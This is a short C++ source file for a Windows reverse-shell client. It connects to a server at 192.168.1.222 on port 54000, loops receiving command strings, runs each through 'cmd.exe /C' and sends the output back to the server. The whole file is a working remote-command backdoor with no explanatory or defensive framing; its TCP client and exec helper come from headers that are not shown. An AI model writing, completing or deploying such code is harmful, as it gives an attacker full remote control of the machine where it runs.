#include <iostream>
#include <string>
#include "TCPClient.h"
#include "utils.h"

int main()
{
	TCPClient* conn = new TCPClient("192.168.1.222", 54000);
	conn->start_connection();
	while (true)
	{
		// recv command from server
		std::string commandLine = "cmd.exe /C ";
		commandLine.append(conn->recv_data());
		std::string result = exec(commandLine);
		
		// send result back to server
		conn->send_data(result);
	}
	return 0;
}
